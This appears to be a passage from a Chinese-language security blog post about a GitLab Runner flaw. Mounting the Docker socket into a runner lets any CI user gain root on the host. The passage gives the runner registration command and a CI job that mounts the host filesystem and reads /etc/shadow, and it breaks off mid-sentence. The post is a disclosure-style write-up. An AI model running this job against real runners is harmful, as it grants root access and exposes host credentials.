gitlab漏洞系列-安装Gitlab runner与Docker-In-Docker允许root权限

声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。

背景

白帽小哥jafarakhondali在2021年12月份提交了这个漏洞,看到这个漏洞的时候，我的第一反应是: 就这？？是的，就这漏洞，gitlab官方也给了100美刀,可见国外对安全的重视,好了，下面来看看这个漏洞:使用官方文档安装Gitlab runner:https://docs.gitlab.com/ee/ci/docker/using_docker_build.html#use-docker-socket-binding 安装好之后,发现允许任何访问Gitlab CI的用户在Gitlab Runner服务器上拥有root权限。

复现

1.使用官方文档安装Gitlab-runner ，并运行Docker-in-Docker:

sudo gitlab-runner register -n \  
  --url https://gitlab.com/ \  
  --registration-token REGISTRATION_TOKEN \  
  --executor docker \  
  --description "My Docker Runner" \  
  --docker-image "docker:19.03.12" \  
  --docker-volumes /var/run/docker.sock:/var/run/docker.sock  

然后为runner设置“exploiter”标签，在有权限访问该runner的项目中，输入以下命令:

stages:  
  - exploiter  
exploiter:  
    stage: exploiter  
    when: manual  
    tags:  
      - exploiter  
    script:  
      - docker run --rm  --net=host --pid=host --ipc=host --volume /:/host ubuntu bash -c "cat /host/etc/shadow"  

运行job;

影响

攻击者可以使用Gitlab服务器的root权限来访问Gitlab- ci中运行的项目及其敏感数据。许多项目在其CI过程中存储了credentials，允许Gitlab运行人员访问其
